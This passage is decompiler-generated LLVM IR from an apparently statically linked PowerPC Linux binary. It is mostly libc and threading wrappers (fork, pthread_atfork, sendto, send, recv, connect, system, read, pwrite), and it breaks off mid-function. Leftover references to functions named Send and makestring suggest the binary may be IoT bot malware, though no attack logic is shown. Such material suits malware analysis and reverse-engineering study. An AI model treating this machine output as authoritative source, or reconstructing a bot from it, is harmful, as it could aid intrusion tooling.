  uselistorder i32 (i32, i32, i32, i32)* @Send, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 2, 1, 0, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 ()* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 12, 11, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %argc, { 1, 0 }
  uselistorder label %dec_label_pc_100047e0, { 1, 0 }
  uselistorder label %dec_label_pc_10004700, { 1, 0 }
  uselistorder label %dec_label_pc_100046ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000468c, { 1, 0 }
  uselistorder label %dec_label_pc_10004674.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100045fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100045dc, { 1, 0 }
  uselistorder label %dec_label_pc_100044e8, { 1, 0 }
  uselistorder label %dec_label_pc_100044c8, { 1, 0 }
  uselistorder label %dec_label_pc_100044ac, { 1, 0 }
  uselistorder label %dec_label_pc_10004458, { 1, 0 }
  uselistorder label %dec_label_pc_10004398, { 1, 0 }
  uselistorder label %dec_label_pc_10004350, { 1, 0 }
  uselistorder label %dec_label_pc_1000427c, { 1, 0 }
  uselistorder label %dec_label_pc_10004268, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_10004220, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000412c, { 1, 0 }
  uselistorder label %dec_label_pc_100040f0, { 1, 0 }
}

define i32 @__h_errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100047f8 = load i32, i32* @r2, align 4
  %v1_100047f8 = add i32 %v0_100047f8, 76
  %v2_100047f8 = inttoptr i32 %v1_100047f8 to i32*
  %v3_100047f8 = load i32, i32* %v2_100047f8, align 4
  ret i32 %v3_100047f8
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  %v0_10004800 = load i32, i32* @r2, align 4
  %v1_10004800 = add i32 %v0_10004800, 68
  %v2_10004800 = inttoptr i32 %v1_10004800 to i32*
  %v3_10004800 = load i32, i32* %v2_10004800, align 4
  ret i32 %v3_10004800
}

define i32 @pthread_insert_list(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10004808 = icmp eq i32 %arg1, 0
  %v0_1000480c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004808, i32 %v0_1000480c)
  %v3_10004810 = icmp eq i32 %arg3, 0
  br i1 %v3_10004810, label %dec_label_pc_1000482c, label %dec_label_pc_10004820.preheader

dec_label_pc_10004820.preheader:                  ; preds = %entry
  call void @llvm.trap()
  unreachable

dec_label_pc_1000482c:                            ; preds = %entry
  store i32 %arg1, i32* %arg2, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %storemerge1 = load i32, i32* @r3, align 4
  store i32 %storemerge1, i32* %r31.global-to-local, align 4
  %v3_100048684 = icmp eq i32 %storemerge1, 0
  br i1 %v3_100048684, label %dec_label_pc_10004870, label %dec_label_pc_10004858

dec_label_pc_10004858:                            ; preds = %entry, %dec_label_pc_10004858
  %v0_10004858 = phi i32 [ %storemerge, %dec_label_pc_10004858 ], [ %storemerge1, %entry ]
  %v1_10004858 = inttoptr i32 %v0_10004858 to i32*
  %v2_10004858 = load i32, i32* %v1_10004858, align 4
  call void @__pseudo_call(i32 %v2_10004858)
  %v0_10004864 = load i32, i32* %r31.global-to-local, align 4
  %v1_10004864 = add i32 %v0_10004864, 4
  %v2_10004864 = inttoptr i32 %v1_10004864 to i32*
  %storemerge = load i32, i32* %v2_10004864, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_10004868 = icmp eq i32 %storemerge, 0
  br i1 %v3_10004868, label %dec_label_pc_10004868.dec_label_pc_10004870_crit_edge, label %dec_label_pc_10004858

dec_label_pc_10004868.dec_label_pc_10004870_crit_edge: ; preds = %dec_label_pc_10004858
  %v0_10004880.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10004870

dec_label_pc_10004870:                            ; preds = %dec_label_pc_10004868.dec_label_pc_10004870_crit_edge, %entry
  %v0_10004880 = phi i32 [ %v0_10004880.pre, %dec_label_pc_10004868.dec_label_pc_10004870_crit_edge ], [ 0, %entry ]
  ret i32 %v0_10004880

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10004858, { 1, 0 }
}

define i32 @fork() local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i32, align 4
  %v0_10004890 = call i32 @__asm_mfcr()
  store i32 ptrtoint (i32* @global_var_1002f4ec.200 to i32), i32* @r27, align 4
  store i32 268454060, i32* @lr, align 4
  %v1_100048a8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002f4ec.200 to i32))
  %v3_100048b0 = load i32, i32* @global_var_1002eff0.201, align 4
  store i32 %v3_100048b0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100048c8.204 to i32), i32* @lr, align 4
  %v0_100048c4 = call i32 @pthread_call_handlers()
  store i32 268454092, i32* @lr, align 4
  %v1_100048c8 = call i32 @__pthread_once_fork_prepare(i32 %v0_100048c4)
  store i32 ptrtoint (i32* @global_var_10033b68.205 to i32), i32* @r28, align 4
  store i32 268454108, i32* @lr, align 4
  %v1_100048d8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10033b68.205 to i32))
  store i32 ptrtoint (i32* @global_var_1003383c.206 to i32), i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_100048ec.207 to i32), i32* @lr, align 4
  %v1_100048e8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1003383c.206 to i32))
  store i32 268454128, i32* @lr, align 4
  %v1_100048ec = call i32 @__libc_fork(i32 %v1_100048e8)
  store i32 %v1_100048ec, i32* @r26, align 4
  %v3_100048f4 = icmp eq i32 %v1_100048ec, 0
  store i32 268468216, i32* @r9, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v0_10004900 = load i32, i32* @r30, align 4
  store i32 %v0_10004900, i32* @r3, align 4
  br i1 %v3_100048f4, label %dec_label_pc_1000493c, label %dec_label_pc_10004988

dec_label_pc_1000493c:                            ; preds = %entry
  %v2_10004908 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10004918 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-56)
  %v3_10004924 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-56, i32 0)
  %v0_10004928 = load i32, i32* @r30, align 4
  %v3_10004930 = call i32 @pthread_mutex_init(i32 %v0_10004928, i32* nonnull %stack_var_-56)
  %v1_10004938 = call i32 @pthread_mutexattr_destroy(i32 %v2_10004908)
  %v0_1000493c = load i32, i32* @r28, align 4
  %v3_10004944 = call i32 @pthread_mutex_init(i32 %v0_1000493c, i32* null)
  %v0_1000494c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000494c, label %dec_label_pc_10004974, label %dec_label_pc_10004950

dec_label_pc_10004950:                            ; preds = %dec_label_pc_1000493c
  %v2_10004950 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-56)
  %v3_1000495c = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-56, i32 0)
  %v0_10004960 = load i32, i32* @r27, align 4
  %v3_10004968 = call i32 @pthread_mutex_init(i32 %v0_10004960, i32* nonnull %stack_var_-56)
  %v1_10004970 = call i32 @pthread_mutexattr_destroy(i32 %v2_10004908)
  br label %dec_label_pc_10004974

dec_label_pc_10004974:                            ; preds = %dec_label_pc_1000493c, %dec_label_pc_10004950
  store i32 ptrtoint (i32* @global_var_10004978.209 to i32), i32* @lr, align 4
  %v0_10004974 = call i32 @__pthread_reset_main_thread()
  store i32 ptrtoint (i32* @global_var_1000497c.210 to i32), i32* @lr, align 4
  %v1_10004978 = call i32 @__fresetlockfiles(i32 %v0_10004974)
  store i32 268454272, i32* @lr, align 4
  %v1_1000497c = call i32 @__pthread_once_fork_child(i32 %v1_10004978)
  br label %dec_label_pc_100049a4

dec_label_pc_10004988:                            ; preds = %entry
  store i32 268454284, i32* @lr, align 4
  %v0_10004988 = call i32 @pthread_mutex_unlock()
  %v0_1000498c = load i32, i32* @r28, align 4
  store i32 %v0_1000498c, i32* @r3, align 4
  store i32 268454292, i32* @lr, align 4
  %v0_10004990 = call i32 @pthread_mutex_unlock()
  %v0_10004994 = load i32, i32* @r27, align 4
  store i32 %v0_10004994, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000499c.211 to i32), i32* @lr, align 4
  %v0_10004998 = call i32 @pthread_mutex_unlock()
  store i32 268454304, i32* @lr, align 4
  %v1_1000499c = call i32 @__pthread_once_fork_parent(i32 %v0_10004998)
  br label %dec_label_pc_100049a4

dec_label_pc_100049a4:                            ; preds = %dec_label_pc_10004974, %dec_label_pc_10004988
  %storemerge.in = phi i32* [ @r31, %dec_label_pc_10004988 ], [ @r25, %dec_label_pc_10004974 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r3, align 4
  store i32 268454312, i32* @lr, align 4
  %v0_100049a4 = call i32 @pthread_call_handlers()
  %v0_100049a8 = load i32, i32* @r26, align 4
  %v1_100049bc = call %0 @__asm_mtcrf(i32 8, i32 %v0_10004890)
  %v9_100049bc = extractvalue %0 %v1_100049bc, 7
  store i4 %v9_100049bc, i4* @cr4, align 1
  ret i32 %v0_100049a8

; uselistorder directives
  uselistorder i32 %v2_10004908, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 ()* @pthread_call_handlers, { 1, 0 }
  uselistorder label %dec_label_pc_100049a4, { 1, 0 }
  uselistorder label %dec_label_pc_10004974, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v0_100049c8 = call i32 @fork()
  ret i32 %v0_100049c8

; uselistorder directives
  uselistorder i32 ()* @fork, { 3, 2, 1, 0 }
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 24, i32* @r3, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 268454384, i32* @lr, align 4
  %v0_100049ec = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_100049f4 = icmp eq i32 %v0_100049ec, 0
  store i32 ptrtoint (i32* @global_var_1002f4ec.200 to i32), i32* %r27.global-to-local, align 4
  br i1 %v3_100049f4, label %dec_label_pc_10004a60, label %dec_label_pc_10004a08

dec_label_pc_10004a08:                            ; preds = %entry
  store i32 268454412, i32* @lr, align 4
  %v1_10004a08 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002f4ec.200 to i32))
  %v0_10004a14 = load i32, i32* @r30, align 4
  %v0_10004a18 = load i32, i32* @r31, align 4
  store i32 268454436, i32* @lr, align 4
  %v4_10004a20 = inttoptr i32 %v0_10004a14 to i32*
  %v5_10004a20 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_1002eff0.201 to i32), i32* %v4_10004a20, i32 %v0_10004a18, i32 0)
  %v0_10004a2c = load i32, i32* @r29, align 4
  %v0_10004a30 = load i32, i32* @r31, align 4
  %v1_10004a30 = add i32 %v0_10004a30, 8
  store i32 268454460, i32* @lr, align 4
  %v4_10004a38 = inttoptr i32 %v0_10004a2c to i32*
  %v5_10004a38 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_1002eff8.203 to i32), i32* %v4_10004a38, i32 %v1_10004a30, i32 1)
  %v0_10004a40 = load i32, i32* @r28, align 4
  %v0_10004a44 = load i32, i32* @r31, align 4
  %v1_10004a44 = add i32 %v0_10004a44, 16
  store i32 268454484, i32* @lr, align 4
  %v4_10004a50 = inttoptr i32 %v0_10004a40 to i32*
  %v5_10004a50 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_1002eff4.202 to i32), i32* %v4_10004a50, i32 %v1_10004a44, i32 1)
  %v0_10004a54 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10004a54, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004a5c.212 to i32), i32* @lr, align 4
  %v0_10004a58 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10004a60

dec_label_pc_10004a60:                            ; preds = %entry, %dec_label_pc_10004a08
  %v0_10004a60 = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_10004a08 ]
  ret i32 %v0_10004a60

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_1002f4ec.200 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10004a60, { 1, 0 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r26.global-to-local, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  %v2_10004a9c = ptrtoint i32* %stack_var_-56 to i32
  store i32 268454572, i32* @lr, align 4
  %v3_10004aa8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004a9c)
  %v0_10004aac = load i32, i32* %r28.global-to-local, align 4
  %v0_10004ab0 = load i32, i32* %r27.global-to-local, align 4
  %v0_10004ab4 = load i32, i32* %r26.global-to-local, align 4
  %v0_10004ab8 = load i32, i32* %r25.global-to-local, align 4
  %v0_10004abc = load i32, i32* %r24.global-to-local, align 4
  %v0_10004ac0 = load i32, i32* %r29.global-to-local, align 4
  store i32 268454600, i32* @lr, align 4
  %v6_10004ac4 = call i32 @__libc_sendto(i32 %v0_10004ac0, i32 %v0_10004aac, i32 %v0_10004ab0, i32 %v0_10004ab4, i32 %v0_10004ab8, i32 %v0_10004abc)
  store i32 %v6_10004ac4, i32* %r29.global-to-local, align 4
  %v3_10004ad0 = load i32, i32* %stack_var_-56, align 4
  store i32 268454616, i32* @lr, align 4
  %v2_10004ad4 = trunc i32 %v3_10004ad0 to i8
  %v3_10004ad4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004ad4, i32 0)
  ret i32 %v6_10004ac4
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004b08 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268454680, i32* @lr, align 4
  %v3_10004b14 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004b08)
  store i32 268454696, i32* @lr, align 4
  %v3_10004b24 = call i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10004b30 = load i32, i32* %stack_var_-40, align 4
  store i32 268454712, i32* @lr, align 4
  %v2_10004b34 = trunc i32 %v3_10004b30 to i8
  %v3_10004b34 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004b34, i32 0)
  ret i32 %v3_10004b24
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004b6c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268454780, i32* @lr, align 4
  %v3_10004b78 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004b6c)
  store i32 268454800, i32* @lr, align 4
  %v4_10004b8c = call i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10004b98 = load i32, i32* %stack_var_-40, align 4
  store i32 268454816, i32* @lr, align 4
  %v2_10004b9c = trunc i32 %v3_10004b98 to i8
  %v3_10004b9c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004b9c, i32 0)
  ret i32 %v4_10004b8c
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004bd0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268454880, i32* @lr, align 4
  %v3_10004bdc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004bd0)
  store i32 268454896, i32* @lr, align 4
  %v3_10004bec = call i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10004bf8 = load i32, i32* %stack_var_-40, align 4
  store i32 268454912, i32* @lr, align 4
  %v2_10004bfc = trunc i32 %v3_10004bf8 to i8
  %v3_10004bfc = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004bfc, i32 0)
  ret i32 %v3_10004bec
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r26.global-to-local, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  %v2_10004c3c = ptrtoint i32* %stack_var_-56 to i32
  store i32 268454988, i32* @lr, align 4
  %v3_10004c48 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004c3c)
  %v0_10004c4c = load i32, i32* %r28.global-to-local, align 4
  %v0_10004c50 = load i32, i32* %r27.global-to-local, align 4
  %v0_10004c54 = load i32, i32* %r26.global-to-local, align 4
  %v0_10004c58 = load i32, i32* %r25.global-to-local, align 4
  %v0_10004c5c = load i32, i32* %r24.global-to-local, align 4
  %v0_10004c60 = load i32, i32* %r29.global-to-local, align 4
  store i32 268455016, i32* @lr, align 4
  %v6_10004c64 = call i32 @__libc_recvfrom(i32 %v0_10004c60, i32 %v0_10004c4c, i32 %v0_10004c50, i32 %v0_10004c54, i32 %v0_10004c58, i32 %v0_10004c5c)
  store i32 %v6_10004c64, i32* %r29.global-to-local, align 4
  %v3_10004c70 = load i32, i32* %stack_var_-56, align 4
  store i32 268455032, i32* @lr, align 4
  %v2_10004c74 = trunc i32 %v3_10004c70 to i8
  %v3_10004c74 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004c74, i32 0)
  ret i32 %v6_10004c64
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004cac = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455100, i32* @lr, align 4
  %v3_10004cb8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004cac)
  store i32 268455120, i32* @lr, align 4
  %v4_10004ccc = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10004cd8 = load i32, i32* %stack_var_-40, align 4
  store i32 268455136, i32* @lr, align 4
  %v2_10004cdc = trunc i32 %v3_10004cd8 to i8
  %v3_10004cdc = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004cdc, i32 0)
  ret i32 %v4_10004ccc
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004d10 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455200, i32* @lr, align 4
  %v3_10004d1c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004d10)
  store i32 268455216, i32* @lr, align 4
  %v3_10004d2c = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10004d38 = load i32, i32* %stack_var_-40, align 4
  store i32 268455232, i32* @lr, align 4
  %v2_10004d3c = trunc i32 %v3_10004d38 to i8
  %v3_10004d3c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004d3c, i32 0)
  ret i32 %v3_10004d2c
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004d70 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455296, i32* @lr, align 4
  %v3_10004d7c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004d70)
  store i32 268455312, i32* @lr, align 4
  %v3_10004d8c = call i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10004d98 = load i32, i32* %stack_var_-40, align 4
  store i32 268455328, i32* @lr, align 4
  %v2_10004d9c = trunc i32 %v3_10004d98 to i8
  %v3_10004d9c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004d9c, i32 0)
  ret i32 %v3_10004d8c
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004dd0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455392, i32* @lr, align 4
  %v3_10004ddc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004dd0)
  store i32 268455408, i32* @lr, align 4
  %v2_10004dec = call i32 @__libc_write(i32 %arg1, i32 %arg2)
  %v3_10004df8 = load i32, i32* %stack_var_-40, align 4
  store i32 268455424, i32* @lr, align 4
  %v2_10004dfc = trunc i32 %v3_10004df8 to i8
  %v3_10004dfc = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004dfc, i32 0)
  ret i32 %v2_10004dec
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004e30 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455488, i32* @lr, align 4
  %v3_10004e3c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004e30)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 268455504, i32* @lr, align 4
  %v3_10004e4c = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_10004e4c, i32* @r29, align 4
  %v3_10004e58 = load i32, i32* %stack_var_-40, align 4
  store i32 268455520, i32* @lr, align 4
  %v2_10004e5c = trunc i32 %v3_10004e58 to i8
  %v3_10004e5c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004e5c, i32 0)
  %v0_10004e64 = load i32, i32* @r29, align 4
  ret i32 %v0_10004e64

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004e84 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455576, i32* @lr, align 4
  %v3_10004e94 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004e84)
  store i32 268455584, i32* @lr, align 4
  %v1_10004e9c = call i32 @__libc_wait(i32 %arg1)
  %v3_10004ea8 = load i32, i32* %stack_var_-40, align 4
  store i32 268455600, i32* @lr, align 4
  %v2_10004eac = trunc i32 %v3_10004ea8 to i8
  %v3_10004eac = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004eac, i32 0)
  ret i32 %v1_10004e9c
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004ed4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455656, i32* @lr, align 4
  %v3_10004ee4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004ed4)
  store i32 268455664, i32* @lr, align 4
  %v1_10004eec = call i32 @__libc_tcdrain(i32 %arg1)
  %v3_10004ef8 = load i32, i32* %stack_var_-40, align 4
  store i32 268455680, i32* @lr, align 4
  %v2_10004efc = trunc i32 %v3_10004ef8 to i8
  %v3_10004efc = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004efc, i32 0)
  ret i32 %v1_10004eec
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004f24 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455736, i32* @lr, align 4
  %v3_10004f34 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004f24)
  store i32 268455744, i32* @lr, align 4
  %v1_10004f3c = call i32 @__libc_system(i32 %arg1)
  %v3_10004f48 = load i32, i32* %stack_var_-40, align 4
  store i32 268455760, i32* @lr, align 4
  %v2_10004f4c = trunc i32 %v3_10004f48 to i8
  %v3_10004f4c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004f4c, i32 0)
  ret i32 %v1_10004f3c
}

define i32 @read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10004f80 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455824, i32* @lr, align 4
  %v3_10004f8c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004f80)
  store i32 268455840, i32* @lr, align 4
  %v1_10004f9c = call i32 @__libc_read(i32 %arg1)
  %v3_10004fa8 = load i32, i32* %stack_var_-40, align 4
  store i32 268455856, i32* @lr, align 4
  %v2_10004fac = trunc i32 %v3_10004fa8 to i8
  %v3_10004fac = call i32 @__GI_pthread_setcanceltype(i8 %v2_10004fac, i32 0)
  ret i32 %v1_10004f9c
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v2_10004fe4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268455924, i32* @lr, align 4
  %v3_10004ff0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10004fe4)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  %v0_10005000 = load i32, i32* %r29.global-to-local, align 4
  store i32 268455944, i32* @lr, align 4
  %v4_10005004 = call i32 @__libc_pwrite(i32 %v0_10005000, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_10005004, i32* %r29.global-to-local, align 4
  %v3_10005010 = load i32, i32* %stack_var_-40, align 4
  store i32 268455960, i32* @lr, align 4
  %v2_10005014 = trunc i32 %v3_10005010 to i8
  %v3_10005014 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10005014, i32 0)
  ret i32 %v4_10005004

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r27.global-to-local, align 4
  store i32 %arg2, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r25.global-to-local, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  %v2_10005050 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268456032, i32* @lr, align 4
  %v3_1000505c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10005050)
  %v0_10005060 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10005060, i32* @r4, align 4
  %v0_10005064 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10005064, i32* @r5, align 4
  %v0_10005068 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10005068, i32* @r7, align 4
  %v0_1000506c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000506c, i32* @r8, align 4
  %v0_10005070 = load i32, i32* %r27.global-to-local, align 4
  store i32 268456056, i32* @lr, align 4
  %v5_10005074 = call i32 @__libc_pread64(i32 %v0_10005070, i32 %v0_10005060, i32 %v0_10005064, i32 %v0_10005068, i32 %v0_1000506c)
  store i32 %v5_10005074, i32* %r29.global-to-local, align 4
  %v3_10005080 = load i32, i32* %stack_var_-56, align 4
  store i32 268456072, i32* @lr, align 4
  %v2_10005084 = trunc i32 %v3_10005080 to i8
